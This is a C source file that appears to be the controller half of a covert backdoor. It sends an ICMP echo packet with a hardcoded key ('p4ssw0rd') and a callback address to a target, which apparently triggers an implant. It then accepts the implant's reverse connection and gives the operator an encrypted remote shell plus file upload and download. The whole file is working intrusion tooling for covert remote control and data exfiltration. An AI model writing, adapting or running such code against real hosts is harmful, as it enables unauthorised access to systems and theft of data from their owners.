#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "common.h"

#define ICMP_PACKET_SIZE 1024
#define LISTEN_MAX 128
#define ICMP_KEY "p4ssw0rd"
char passwd[128];
char destaddr[16], localaddr[16];
int localport;

void file_upload(int fd, char *filepath);
void file_download(int confd, char *filepath);
int analy(char *t_buf, char *p_buf);
void data_handler(int confd);
int Listen();
void do_thing();
unsigned short cal_chksum(unsigned short *addr, int len);
void send_packet(int sockfd, int pid);

void file_upload(int confd, char *filepath)
{
	if (strcmp(filepath, "file_exits") == 0)
	{
		fprintf(stdout, "file upload fail,because the receiving file already exists!\n");
		fflush(stdout);
		return;
	}
	int len, fd;
	char buf[MAXBUF];
	while (1)
	{
		if (access(filepath, F_OK) == 0)
		{
			fd = open(filepath, O_RDONLY);
			while ((len = read(fd, buf, MAXBUF)))
			{
				if (len == -1)
				{
					strcpy(buf, "error");
					send(confd, buf, MAXBUF, 0);
					fprintf(stdout, "file transfer error!\n");
					fflush(stdout);
					break;
				}
				else
				{
					send(confd, buf, len, 0);
				}
				memset(buf, 0, MAXBUF);
				usleep(1000);
			}
			strcpy(buf, "end");
			send(confd, buf, MAXBUF, 0);
			close(fd);
			usleep(1000);
			fprintf(stdout, "file upload success!\n");
			fflush(stdout);
			break;
		}
		else
		{
			strcpy(buf, "nofile");
			send(confd, buf, MAXBUF, 0);
			fprintf(stdout, "file upload fail,because file does not exist!\n");
			fflush(stdout);
			break;
		}
	}
}

void file_download(int confd, char *filepath)
{
	int fd, len, ret;
	char _buf[MAXBUF];
	char sFilePath[256], sDir[256], sFileName[256];
	strcpy(sFilePath, filepath);
	FilePathParse(sFilePath, sDir, sFileName);
	if (strcmp(filepath, "file_noexit") == 0)
	{
		fprintf(stdout, "file download fail,because the sender file does not exist!\n");
		fflush(stdout);
		return;
	}
	if (access(sFileName, F_OK) == 0)
	{
		fd = open(sFileName, O_WRONLY | O_TRUNC);
	}
	else
	{
		fd = open(sFileName, O_CREAT|O_WRONLY | O_TRUNC, 0664);
	}
	setBlocking(confd);
	while (1)
	{
		len = recv(confd, _buf, MAXBUF, 0);
		if (len == -1)
		{
			perror("recv error");
			exit(EXIT_FAILURE);
		}
		else if (len > 0)
		{
			if (strcmp(_buf, "error") == 0)
			{
				perror("file transfer error");
				close(fd);
				break;
			}
			else if (strcmp(_buf, "end") == 0)
			{
				close(fd);
				fprintf(stdout, "file download success!\n");
				fflush(stdout);		
				break;
			}
			else
			{
				write(fd, _buf, len);
				//fprintf(stdout,"buf=%s,len=%d\n",_buf,len);fflush(stdout);
			}
		}
	}
	setNonBlocking(confd);
}

int analy(char *t_buf, char *p_buf)
{
	struct msg m;
	int len = strlen(t_buf);
	int length;
	long type;
	char temp[_SIZE_];
	int i;
	memset(&m, 0, sizeof(m));
	for (i = 0; i < len;)
	{
		if (t_buf[i] == ' ')
		{
			memcpy(temp, &t_buf[0], i);
			type = atoi(temp);
			if (type < 0 || type > 2)
			{
				fprintf(stdout, "input type error!\n");
				fflush(stdout);
				return -1;
			}
			m.type = type;
			i++;
			if (type == 2)
			{
				memcpy(m.content.message, &t_buf[i], len - i);
				memcpy(p_buf, &m, sizeof(struct msg));
				return 0;
			}
			else
			{
				if (t_buf[i] > '0' && t_buf[i] < '4')
				{
					m.content.mymsgbuf.mtype = t_buf[i] - '0';
					i++;
					if (t_buf[i] != ' ')
					{
						fprintf(stdout, "input format error!\n");
						fflush(stdout);
						return -1;
					}
					else
					{
						i++;
						memcpy(m.content.mymsgbuf.mtext, &t_buf[i], len - i);
						memcpy(p_buf, &m, sizeof(struct msg));
						return m.content.mymsgbuf.mtype;
					}
				}
				else
				{
					fprintf(stdout, "input format error!\n");
					fflush(stdout);
					return -1;
				}
			}
		}
		else
		{
			i++;
		}
	}
	if (i == len)
	{
		fprintf(stdout, "input format error!\n");
		fflush(stdout);
		return -1;
	}
}

void data_handler(int confd)
{
	struct sockaddr_in sa;
	const unsigned char *ip;
	unsigned short port;

	socklen_t sa_len = sizeof(struct sockaddr_in);
	if (getpeername(confd, (struct sockaddr *)&sa, &sa_len) == -1)
	{
		fprintf(stdout, "Get Remote Host Failed\n");
		close(confd);
		return;
	}
	ip = (unsigned char *)inet_ntoa(sa.sin_addr);
	port = htons(sa.sin_port);

	int epoll_fd = epoll_create(OPEN_MAX);
	if (epoll_fd < 0)
	{
		fprintf(stdout, "\n[+]epoll_create Fail\n\n");
		fflush(stdout);
		close(confd);
		exit(EXIT_FAILURE);
	}
	struct epoll_event ep_ev;
	ep_ev.events = EPOLLIN;
	ep_ev.data.fd = confd;
	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, confd, &ep_ev) < 0)
	{
		fprintf(stdout, "\n[+]epoll_ctl Fail\n\n");
		fflush(stdout);
		close(confd);
		exit(EXIT_FAILURE);
	}

	ep_ev.events = EPOLLIN;
	ep_ev.data.fd = 0;
	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, 0, &ep_ev) < 0)
	{
		fprintf(stdout, "\n[+]epoll_ctl Fail\n\n");
		fflush(stdout);
		exit(EXIT_FAILURE);
	}

	struct epoll_event ready_ev[OPEN_MAX];
	int timeout = -1;

	struct msg msg1;
	unsigned char p_buf[_SIZE_], c_buf[_SIZE_], temp_buf[_SIZE_];
	int ret;
	int OK = 1;
	fprintf(stdout, "##");
	fflush(stdout);
	while (OK)
	{
		switch (ret = epoll_wait(epoll_fd, ready_ev, OPEN_MAX, timeout))
		{
		case -1:
			perror("epoll_wait");
			break;
		case 0:
			printf("time out...\n");
			break;
		default:
		{
			int i;
			for (i = 0; i < ret; ++i)
			{
				if (ready_ev[i].events & EPOLLIN)
				{
					int fd = ready_ev[i].data.fd;
					if (fd == confd)
					{
						int len = Readn(confd, c_buf, _SIZE_);
						if (len > 0)
						{
							decode(p_buf, c_buf);
							memcpy(&msg1, p_buf, sizeof(struct msg));
							if (msg1.type == MSG_QUEUE_TYPE)
							{
								switch (msg1.content.mymsgbuf.mtype)
								{
								case BASH_TYPE:
									if (strcmp(msg1.content.mymsgbuf.mtext, "end") == 0)
									{
										fprintf(stdout, "##");
										fflush(stdout);
										break;
									}
									fprintf(stdout, "%s", msg1.content.mymsgbuf.mtext);
									break;
								case FILE_UPLOAD_TYPE:
									file_upload(confd, msg1.content.mymsgbuf.mtext);
									fprintf(stdout, "##");
									fflush(stdout);
									break;
								case FILE_DOWNLOAD_TYPE:
									file_download(confd, msg1.content.mymsgbuf.mtext);
									fprintf(stdout, "##");
									fflush(stdout);
									break;
								default:
									fprintf(stdout, "recv fail,because type error!!\n");
									fprintf(stdout, "##");
									fflush(stdout);
									break;
								}
							}
							else
							{
								if (strncasecmp(msg1.content.message, "quit", 4) == 0)
								{
									fprintf(stdout, "quit...\n");
									close(confd);
									exit(EXIT_SUCCESS);
								}
								else
								{
									printf("recv from ip:%s port:%d massage:%s\n", ip, port, msg1.content.message);
									fprintf(stdout, "##");
									fflush(stdout);
									continue;
								}
							}
						}
						else if (len == -1)
						{
							perror("Read error");
							exit(EXIT_SUCCESS);
						}
						else if (len == 0)
						{
							OK = 0;
							fprintf(stdout, "\nConnection Cutdown\n\n");
							fprintf(stdout, "quit...\n");
							fflush(stdout);
							exit(EXIT_SUCCESS);
						}
					}
					else
					{
						int choose;
						fgets(temp_buf, _SIZE_, stdin);
						temp_buf[strlen(temp_buf) - 1] = '\0';
						choose = analy(temp_buf, p_buf);
						if (choose >= 0)
						{
							encryption(p_buf, c_buf);
							int len = Writen(confd, c_buf, _SIZE_);
							if (len <= 0)
							{
								perror("write error");
								exit(EXIT_FAILURE);
							}
						}
					}
				}
			}
			break;
		}
		}
	}
	close(confd);
}

int Listen()
{
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1)
	{
		perror("create socket error");
		return 1;
	}
	int flag = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&flag, sizeof(flag));
	struct sockaddr_in seraddr;
	bzero(&seraddr, sizeof(seraddr));
	seraddr.sin_family = AF_INET;
	inet_pton(AF_INET, localaddr, &seraddr.sin_addr.s_addr);
	seraddr.sin_port = htons(localport);
	if (bind(sockfd, (struct sockaddr *)&seraddr, sizeof(seraddr)) == -1)
	{
		perror("bind error");
		close(sockfd);
		return 2;
	}
	if (listen(sockfd, LISTEN_MAX) == -1)
	{
		perror("listen error");
		close(sockfd);
		return 3;
	}
	return sockfd;
}

void do_thing()
{
	int sockfd = Listen();
	struct sockaddr_in cliaddr;
	socklen_t len = sizeof(cliaddr);
	int confd = accept(sockfd, (struct sockaddr *)&cliaddr, &len);
	if (confd < 0)
	{
		perror("accept fail!");
		return;
	}
	fprintf(stdout, "accept succuess!\n");
	fflush(stdout);
	fprintf(stdout, "包的格式为:消息类型 [消息队列类型 or 内容] [消息队列内容]\n");
	fflush(stdout);
	setNonBlocking(confd);
	data_handler(confd);
}
//crc32的校验计算方法
unsigned short cal_chksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1)
	{
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

void send_packet(int sockfd, int pid)
{
	char buf[ICMP_PACKET_SIZE] = "";
	struct icmp *icmp;

	//开始填充icmp首部
	icmp = (struct icmp *)buf;
	icmp->icmp_type = ICMP_ECHO; //类型8 请求回显
	icmp->icmp_code = 0;
	icmp->icmp_cksum = 0;
	icmp->icmp_seq = 0;
	icmp->icmp_id = pid;
	icmp->icmp_cksum = cal_chksum((unsigned short *)icmp, sizeof(struct icmp));
	//开始填充数据
	sprintf(icmp->icmp_data, "%s %15s %d", passwd, localaddr, localport);

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	inet_pton(AF_INET, destaddr, &dest_addr.sin_addr.s_addr);
	int size = sizeof(icmp) + strlen(icmp->icmp_data);
	while (1)
	{
		if (sendto(sockfd, buf, size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0)
		{
			perror("sendto error");
			continue;
		}
		else
			break;
	}
	//printf("send success! length=%d\n",size);
	if (strcmp(passwd, ICMP_KEY) == 0)
	{
		fprintf(stdout, "key is correct!\n");
		fflush(stdout);
		close(sockfd);
		do_thing();
	}
	else
	{
		fprintf(stdout, "key error!\n");
		fflush(stdout);
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char *argv[])
{
	int sockfd;
	pid_t pid;
	int size = 50 * 1024;

	if (argc != 5)
	{
		printf("usage:%s [dest_addr] [key] [localaddr] [localport]\n", argv[0]);
		return 0;
	}
	setuid(getuid());

	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
	{
		perror("socket error");
		exit(1);
	}

	//改变接收buf大小
	setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));

	strcpy(destaddr, argv[1]);
	strcpy(passwd, argv[2]);
	strcpy(localaddr, argv[3]);
	localport = atoi(argv[4]);

	pid = getpid();
	send_packet(sockfd, pid);
	return 0;
}
